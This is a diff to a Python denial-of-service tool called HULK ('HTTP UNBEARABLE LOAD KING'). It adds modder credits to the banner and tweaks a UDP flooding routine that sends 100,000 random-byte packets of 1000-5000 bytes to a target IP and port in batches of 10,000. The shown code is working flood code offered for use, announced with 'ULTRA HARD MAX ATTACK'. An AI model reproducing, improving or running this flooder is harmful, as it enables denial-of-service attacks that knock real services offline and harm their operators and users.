@@ -9,11 +9,13 @@ def print_banner():
     ************************************************
     *            _  _ _   _ _    _  __             *
     *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
+    *           | __ | |_| | |__|'<              *
     *           |_||_|\___/|____|_|\_\             *
     *                                              *
     *          HTTP UNBEARABLE LOAD KING           *
     *          Author: Sumalya Chatterjee          *
+    *          MODDED BY: Dev                     *
+    *          Github: Dev-Yoko                   *
     *                                              *
     ************************************************
     ************************************************
@@ -47,7 +49,7 @@ def send_packet(args):
     ip, port = args
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
         try:
-            bytes = random._urandom(random.randint(1000, 5000))  # Randomize packet size more
+            bytes = os.urandom(random.randint(1000, 5000))  # Fixed random packet size
             sock.sendto(bytes, (ip, port))
             return True
         except Exception as e:
@@ -55,8 +57,8 @@ def send_packet(args):
             return False
 
 def send_packets(ip, port, pool):
-    total_packets = 100000  # Increase total packets further
-    batch_size = 10000  # Increase batch size further
+    total_packets = 100000  # Increased total packets
+    batch_size = 10000  # Increased batch size
     packets_sent = 0
     print(" [+] HULK READY FOR ULTRA HARD MAX ATTACK! 💥")
     try:
